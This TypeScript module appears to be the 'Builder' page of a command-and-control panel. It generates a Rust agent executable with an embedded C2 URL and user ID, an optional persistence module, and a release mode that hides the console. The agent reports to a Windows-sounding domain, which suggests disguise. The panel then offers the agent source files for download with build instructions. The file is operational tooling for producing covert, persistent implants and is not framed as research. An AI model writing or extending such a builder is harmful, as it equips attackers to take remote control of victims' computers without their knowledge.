import { api } from "./api.js";
import { toast } from "./toast.js";

export function renderBuilder(): string {
  return `
    <h1>Builder</h1>
    <p class="page-sub">Generate a Rust agent. C2 URL and user ID are auto-detected from your session.</p>

    <div class="builder-layout">
      <div class="card builder-cfg">
        <div class="builder-section">
          <h3>Build Configuration</h3>
          <label>Build Name</label>
          <input id="b-name" value="hidencloud-agent" placeholder="Build name" />

          <div class="toggle-option">
            <span>Enable Startup</span>
            <label class="toggle"><input type="checkbox" id="b-startup" /><span class="toggle-slider"></span></label>
          </div>

          <div class="toggle-option">
            <span>Enable Debug</span>
            <label class="toggle"><input type="checkbox" id="b-debug" /><span class="toggle-slider"></span></label>
          </div>
        </div>
      </div>

      <div class="card builder-preview">
        <div class="preview-header">
          <div class="preview-icon">⚡</div>
          <div>
            <div class="preview-title" id="preview-title">hidencloud-agent.exe</div>
            <div class="muted" id="preview-target" style="font-size:11px">windowssys.hidenmc.com/&lt;auto&gt;</div>
          </div>
        </div>

        <div class="preview-stats">
          <div><span>Language</span><strong>Rust</strong></div>
          <div><span>Format</span><strong>EXE</strong></div>
          <div><span>Startup</span><strong id="preview-startup">Off</strong></div>
          <div><span>Debug</span><strong id="preview-debug">Off</strong></div>
        </div>

        <div class="build-log" id="build-log">
          <div class="muted">Ready. Press Create Build to generate.</div>
        </div>

        <button class="primary build-btn" id="b-build">Create Build</button>
      </div>
    </div>
  `;
}

export function bindBuilder(root: HTMLElement): void {
  const $ = <T extends HTMLElement>(sel: string) => root.querySelector<T>(sel)!;

  const nameInput = $<HTMLInputElement>("#b-name");
  const startupCb = $<HTMLInputElement>("#b-startup");
  const debugCb = $<HTMLInputElement>("#b-debug");

  function update(): void {
    const name = nameInput.value || "hidencloud-agent";
    $("#preview-title").textContent = `${name}.exe`;
    $("#preview-startup").textContent = startupCb.checked ? "Enabled" : "Off";
    $("#preview-debug").textContent = debugCb.checked ? "On" : "Off";
  }

  nameInput.addEventListener("input", update);
  startupCb.addEventListener("change", update);
  debugCb.addEventListener("change", update);

  const log = $<HTMLDivElement>("#build-log");
  const buildBtn = $<HTMLButtonElement>("#b-build");

  buildBtn.addEventListener("click", async () => {
    buildBtn.disabled = true;
    buildBtn.textContent = "Building…";
    log.innerHTML = "";

    const buildName = nameInput.value || "hidencloud-agent";
    const startup = startupCb.checked;
    const debug = debugCb.checked;

    const steps = [
      "Initializing Rust project…",
      "Writing src/main.rs…",
      startup ? "Including persistence module…" : "Skipping persistence…",
      "Writing Cargo.toml…",
      debug ? "Debug mode — console output active" : "Release mode — console hidden",
      "Embedding C2 URL (auto-detected user ID)…",
      "Done.",
    ];

    for (const s of steps) {
      await new Promise((r) => setTimeout(r, 250));
      const line = document.createElement("div");
      line.className = "build-line";
      line.textContent = "▸ " + s;
      log.appendChild(line);
      log.scrollTop = log.scrollHeight;
    }

    try {
      const res = await api.build({ buildName, startup, debug } as any);

      const done = document.createElement("div");
      done.className = "build-line ok";
      done.textContent = `✓ Build "${buildName}" ready — ${(res as any).c2Url}`;
      log.appendChild(done);

      // Download main.rs
      const blob = new Blob([res.contents], { type: "text/plain" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "main.rs";
      a.textContent = "⬇ main.rs";
      a.className = "download-link";
      log.appendChild(a);

      // Download Cargo.toml
      if ((res as any).cargoContents) {
        const ca = document.createElement("a");
        ca.href = URL.createObjectURL(new Blob([(res as any).cargoContents], { type: "text/plain" }));
        ca.download = "Cargo.toml";
        ca.textContent = "⬇ Cargo.toml";
        ca.className = "download-link";
        log.appendChild(ca);
      }

      // Download persistence.rs if included
      if ((res as any).persistenceContents) {
        const pa = document.createElement("a");
        pa.href = URL.createObjectURL(new Blob([(res as any).persistenceContents], { type: "text/plain" }));
        pa.download = "persistence.rs";
        pa.textContent = "⬇ persistence.rs";
        pa.className = "download-link";
        log.appendChild(pa);
      }

      const info = document.createElement("div");
      info.className = "build-line muted";
      info.textContent = "Place files in rustagent/src/ → cargo build --release";
      log.appendChild(info);

      toast(`Build "${buildName}" created`, "success");
    } catch (err) {
      const line = document.createElement("div");
      line.className = "build-line err";
      line.textContent = "✗ " + (err instanceof Error ? err.message : "Build failed");
      log.appendChild(line);
      toast("Build failed", "warn");
    } finally {
      buildBtn.disabled = false;
      buildBtn.textContent = "Create Build";
    }
  });

  update();
}
